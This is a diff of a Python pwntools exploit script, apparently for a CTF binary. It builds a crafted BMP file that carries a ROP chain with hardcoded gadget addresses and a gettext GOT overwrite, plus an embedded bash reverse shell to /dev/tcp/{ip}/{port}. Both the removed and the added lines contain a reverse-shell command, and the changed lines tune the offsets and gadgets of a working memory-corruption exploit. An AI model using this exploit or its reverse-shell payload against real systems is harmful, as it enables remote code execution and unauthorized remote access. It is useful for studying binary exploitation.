@@ -15,30 +15,31 @@ pop_rbp = 0x0000000000404a39
 leave_ret = 0x000000000040a392
 syscall = 0x00000000004066b3
 addr = 0x48a930
-movinrbp_rdi = 0x00000000004220e0
+mov_inrbp_rdi = 0x00000000004220e0
+mov_inrdx_rax = 0x0000000000436bf9
 
 headerfile = b'BMzL\x02\x00\x00\x00\x00\x00>\x00\x00\x00(\x00\x00\x00\xd3\x05\x00\x00!\x03\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00<L\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x00'
-shellrv = f"bash -c '/bin/bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1'\x00"
-shell = headerfile + b'a'*128
+shellrv = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\x00"
+rop = headerfile + b'a'*0x28
 
-off_ip = len(ip) + len(str(port)) - 16
-shell_addr = 0x48aed8 #+ off_ip
+shell_addr = 0x48a990
 
-shell += flat(
+rop += flat(
     pop_rax_rbx_rbp+1, 0x13e10, exe.got['gettext'] + 0x3d,
     add_irbp_ebx,
     pop_rdi, shell_addr,
     exe.sym['gettext'],
     word_size=64, sign = True
 )
-shell += shell.ljust(0x500, b'\xff') + shellrv.encode().ljust(0x50, b'\xff') + shellrv.encode()
-shell = shell.ljust(0x24c71, b'\xff') + 0x3e*b'a'
+rop += shellrv.encode()
+rop = rop.ljust(0x24caf, b'\x00')
 
-rop = flat(
+rop += flat(
     addr,
-    movinrbp_rdi, addr + 8,
+    pop_rdx, addr-8,
+    mov_inrdx_rax, addr + 8,
     pop_rdi, addr,
-    movinrbp_rdi, addr + 0x20,
+    mov_inrbp_rdi, addr + 0x20,
     pop_rdx, 0x6d0,
     0x41B355,
     pop_rbp, addr,
@@ -46,9 +47,7 @@ rop = flat(
     word_size=64, sign = True
 )
 
-shell += rop
-
-with open('test.bmp', 'wb') as f:
-  f.write(shell)
+with open('payload.bmp', 'wb') as f:
+  f.write(rop)
 
 
